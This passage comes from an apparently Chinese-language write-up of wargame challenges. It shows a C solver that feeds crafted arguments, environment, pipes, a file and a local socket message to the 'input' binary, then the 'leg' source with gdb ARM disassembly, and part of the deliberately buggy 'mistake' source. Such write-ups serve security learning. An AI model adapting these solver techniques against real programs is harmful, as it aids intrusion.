</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[</span><span class="mi">101</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">=</span><span class="se">\xca\xfe\xba\xbe</span><span class="s">&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
    <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/home/input2/input&#34;</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;a&#34;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">argv</span><span class="p">[</span><span class="sc">&#39;A&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">;</span>
    <span class="n">argv</span><span class="p">[</span><span class="sc">&#39;B&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x20\x0a\x0d</span><span class="s">&#34;</span><span class="p">;</span>
    <span class="n">argv</span><span class="p">[</span><span class="sc">&#39;C&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;8888&#34;</span><span class="p">;</span>
    <span class="n">argv</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x0a</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;wb+&#34;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;Cannot open 0a&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

    <span class="n">fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">pipe_stdin</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">},</span> <span class="n">pipe_stderr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">};</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">pipe_stdin</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">pipe</span><span class="p">(</span><span class="n">pipe_stderr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;Cannot create pipe&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pid_t</span> <span class="n">pid_child</span><span class="p">;</span>
    <span class="k">if</span><span class="p">((</span><span class="n">pid_child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;Cannot create child process&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pid_child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span> <span class="c1">// 子进程
</span><span class="c1"></span>        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipe_stdin</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipe_stderr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">write</span><span class="p">(</span><span class="n">pipe_stdin</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x00\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="c1">// 信道写入端
</span><span class="c1"></span>        <span class="n">write</span><span class="p">(</span><span class="n">pipe_stderr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x02\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipe_stdin</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipe_stderr</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">pipe_stdin</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// 信道读取端
</span><span class="c1"></span>        <span class="n">dup2</span><span class="p">(</span><span class="n">pipe_stderr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">2</span><span class="p">);</span>

        <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/home/input2/input&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">;</span>
    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">sockfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;Cannot create socket!&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">);</span>
	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;C&#39;</span><span class="p">]));</span>
    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;Cannot connect to server&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">4</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="leg">leg</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">key1</span><span class="p">(){</span>
	<span class="k">asm</span><span class="p">(</span><span class="s">&#34;mov r3, pc</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">key2</span><span class="p">(){</span>
	<span class="k">asm</span><span class="p">(</span>
	<span class="s">&#34;push	{r6}</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;add	r6, pc, $1</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;bx	r6</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;.code   16</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;mov	r3, pc</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;add	r3, $0x4</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;push	{r3}</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;pop	{pc}</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;.code	32</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="s">&#34;pop	{r6}</span><span class="se">\n</span><span class="s">&#34;</span>
	<span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">key3</span><span class="p">(){</span>
	<span class="k">asm</span><span class="p">(</span><span class="s">&#34;mov r3, lr</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
	<span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Daddy has very strong arm! : &#34;</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key1</span><span class="p">()</span><span class="o">+</span><span class="n">key2</span><span class="p">()</span><span class="o">+</span><span class="n">key3</span><span class="p">())</span> <span class="o">==</span> <span class="n">key</span> <span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Congratz!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;flag&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
		<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
		<span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
		<span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span><span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;I have strong leg :P</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>arm的返回值存储在<code>r0</code>寄存器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">disass</span> <span class="no">key1</span>
<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">key1</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00008cd4</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>	<span class="err">{</span><span class="no">r11</span><span class="err">}</span>		<span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008cd8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>	<span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008cdc</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>	<span class="no">r3</span><span class="p">,</span> <span class="no">pc</span>
   <span class="err">0</span><span class="nf">x00008ce0</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008ce4</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>	<span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008ce8</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>	<span class="err">{</span><span class="no">r11</span><span class="err">}</span>		<span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008cec</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">bx</span>	<span class="no">lr</span>
<span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">disass</span> <span class="no">key2</span>
<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">key2</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00008cf0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>	<span class="err">{</span><span class="no">r11</span><span class="err">}</span>		<span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008cf4</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>	<span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008cf8</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>	<span class="err">{</span><span class="no">r6</span><span class="err">}</span>		<span class="c">; (str r6, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008cfc</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>	<span class="no">r6</span><span class="p">,</span> <span class="no">pc</span><span class="p">,</span> <span class="c">#1
</span><span class="c"></span>   <span class="mi">0x00008d00</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">bx</span>	<span class="no">r6</span>
   <span class="err">0</span><span class="nf">x00008d04</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>	<span class="no">r3</span><span class="p">,</span> <span class="no">pc</span>
   <span class="err">0</span><span class="nf">x00008d06</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">adds</span>	<span class="no">r3</span><span class="p">,</span> <span class="c">#4
</span><span class="c"></span>   <span class="mi">0x00008d08</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>	<span class="err">{</span><span class="no">r3</span><span class="err">}</span>
   <span class="err">0</span><span class="nf">x00008d0a</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>	<span class="err">{</span><span class="no">pc</span><span class="err">}</span>
   <span class="err">0</span><span class="nf">x00008d0c</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>	<span class="err">{</span><span class="no">r6</span><span class="err">}</span>		<span class="c">; (ldr r6, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008d10</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d14</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>	<span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008d18</span> <span class="err">&lt;+</span><span class="mi">40</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>	<span class="err">{</span><span class="no">r11</span><span class="err">}</span>		<span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008d1c</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">bx</span>	<span class="no">lr</span>
<span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">disass</span> <span class="no">key3</span>
<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">key3</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00008d20</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>	<span class="err">{</span><span class="no">r11</span><span class="err">}</span>		<span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008d24</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>	<span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008d28</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>	<span class="no">r3</span><span class="p">,</span> <span class="no">lr</span>
   <span class="err">0</span><span class="nf">x00008d2c</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d30</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>	<span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008d34</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>	<span class="err">{</span><span class="no">r11</span><span class="err">}</span>		<span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008d38</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">bx</span>	<span class="no">lr</span>
<span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</code></pre></td></tr></table>
</div>
</div><p>计算一下key1,key2,key3结束时r0寄存器的值相加即可。</p>
<h2 id="mistake">mistake</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define PW_LEN 10
</span><span class="cp">#define XORKEY 1
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">xor</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">){</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">XORKEY</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
	
	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;can&#39;t open password %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;do not bruteforce...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">sleep</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="p">);</span>

	<span class="kt">char</span> <span class="n">pw_buf</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">len</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">pw_buf</span><span class="p">,</span><span class="n">PW_LEN</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;read error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>		
	<span class="p">}</span>

	<span class="kt">char</span> <span class="n">pw_buf2</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;input password : &#34;</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%10s&#34;</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">);</span>

	<span class="c1">// xor your input
</span><span class="c1"></span>	<span class="n">xor</span><span class="p">(</span><span class="n">pw_buf2</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">pw_buf</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">,</span> <span class="n">PW_LEN</span><span class="p">)){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Password OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span><span class="p">{</span>
